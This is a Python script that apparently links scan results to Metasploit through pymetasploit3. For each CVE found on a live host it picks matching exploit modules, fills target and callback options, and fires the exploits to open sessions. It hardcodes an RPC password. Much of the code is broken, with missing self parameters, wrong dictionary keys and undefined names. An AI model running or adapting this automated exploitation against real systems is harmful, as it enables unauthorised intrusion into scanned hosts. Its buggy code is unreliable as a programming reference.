from pymetasploit3.msfrpc import MsfRpcClient
from parse_scan import parse_from_JSON
from sys import argv

my_ip = "0.0.0.0"

class MetasploitManager:
    def __init__(self, password: str, port:int):
        self.parsed_scan = None
        self.options = None
        self.manager = MsfRpcClient(password, port)

    def change_scan(parsed_scan: dict):
        self.parsed_scan = parsed_scan 
        self.options = {}

    def analyze_targets(self):
        """Find useful modules from Metasploit manager based on CVE in parsed_scan 
        and fill the missing required option using the information stored in parsed_scan"""
        for ip, scan in self.parsed_scan.items():
            if scan["state"] != "up":
                continue
            for port, info in scan["ports"].items():
                cve_set = info.get("vulner")
                if cve_set:
                    if not self.options.get(ip):
                        self.options[ip] = {}
                    if not self.options[ip].get(port):
                        self.options[port] = {}
                for cve in cve_set:
                    self.options[ip][port][cve] = {}
                    self.get_module(ip, port, cve)

    def get_module(self, ip: str, port: str, cve: str):
        module_list = self.manager.modules.search(cve)
        for module in module_list:
            if (module and
                (module_name := module.get("fullname")) and
                (module.get("type") == "exploit")):
                exploit = self.manager.modules.use("exploit", module_name)
                self.options[ip][port][cve] = {"module_name": module_name}
                missing = exploit.missing_required
                for option in exploit.options:
                    if option in missing:
                        self.options[ip][port][cve][option] = fill_option(option, ip, port, my_ip)
                    else:
                        self.options[ip][port][cve][option] = exploit[option]
                self.options[ip][port][cve]['worked'] = None

    def fill_option(self, option_name:str, target_ip:str, target_port:int, my_ip: str)->str | int:
        """Chose which passed value to return based on option_name"""
        option_upper = option_name.upper()
        if option_upper == "RHOSTS" or option_upper == "RHOST":
            return target_ip
        elif option_upper == "SRVHOST" or option_upper == "CHOST":
            return my_ip
        elif option_upper == "RPORT":
            return target_port
        else:
            print("Option does not exist")
            return None
    
    def exploit(ip: str, port: int, cve: str):
        options = self.options[ip][port][cve]
        exploit = self.manager.modules.use("exploit", options["module_name"])
        for option in options:
            module[option] = options[options]
        exploit.execute()
        return a.sessions.list[-1]
    
if __name__ == "__main__":
    if len(argv) < 2:
        print("Usage: py parse_metasploit.py <file>; e.g. py parse_metasploit.py seed/10.1.0.1.json")
        exit(1)
    result = parse_from_JSON(argv[1])
    manager = MetasploitManager('JW19ka73', 55552)
    manager.analyze_targets(result)